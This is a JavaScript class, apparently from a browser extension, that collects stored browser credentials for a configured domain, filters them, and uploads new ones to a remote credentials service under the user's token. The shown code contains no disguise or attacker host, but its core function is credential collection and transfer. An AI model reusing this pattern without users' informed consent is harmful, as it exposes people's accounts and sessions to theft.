class MaangSync {
    static async syncCredentials(domainConfig, userAPI, credentialsAPI) {
        try {
            if (!domainConfig) {
                return {
                    success: false,
                    error: 'No domain config',
                    message: 'Domain configuration not provided',
                    data: null
                };
            }
            
            const credentialsResult = await BrowserDataCollector.getBrowserData(null, null, domainConfig, null);

            if (!credentialsResult.success || !credentialsResult.data?.credentials) {
                return {
                    success: false,
                    error: 'Collection failed',
                    message: 'Failed to collect browser credentials',
                    data: null
                };
            }

            const validationResult = await CredentialValidator.validateCredentials(credentialsResult.data.credentials, 'structure_filter');
            if (!validationResult.success || !validationResult.data?.credentials) {
                return {
                    success: false,
                    error: 'Validation failed',
                    message: 'Failed to validate collected credentials',
                    data: null
                };
            }

            const credentials = validationResult.data.credentials;
            
            const userValidation = await userAPI.validateUser();
            
            if (!userValidation.success) {
                return {
                    success: false,
                    error: 'User not validated',
                    message: 'User validation required for credential sync',
                    data: null
                };
            }
            
            const existingCredsResult = await credentialsAPI.getCredentials(userValidation.data.token);
            
            let shouldStore = true;
            const existingCredentials = existingCredsResult.data?.credentials || [];
            if (existingCredsResult.success && existingCredentials.length > 0) {
                for (let i = 0; i < existingCredentials.length; i++) {
                    const storedCred = existingCredentials[i];
                    
                    const comparisonResult = await CredentialValidator.validateCredentials(
                        credentials,
                        'match_provided',
                        storedCred
                    );
                    
                    if (comparisonResult.success) {
                        shouldStore = false;
                       console.log('Credentials already stored')
                        break;
                    }
                }
            }
            
            let syncResult = { success: true };
            if (shouldStore) {
                syncResult = await credentialsAPI.storeCredentials(userValidation.data.token, credentials);
            }
            
            if (syncResult.success) {
                const domainKey = `${domainConfig.key.toLowerCase()}_credentials_lastupdate`;
                await StorageUtils.set({
                    [domainKey]: new Date().toISOString()
                });
            }
            
            if (syncResult.success) {
                console.log('MAANG credentials synced successfully');
            }

            return {
                success: syncResult.success,
                error: syncResult.error,
                message: syncResult.message || 'MAANG credentials synced successfully',
                data: syncResult.data
            };

        } catch (error) {
            console.error('❌ MaangSync: Sync failed with error:', error.message);
            return {
                success: false,
                error: 'MAANG sync error',
                message: `Error syncing MAANG credentials: ${error.message}`,
                data: null
            };
        }
    }
}
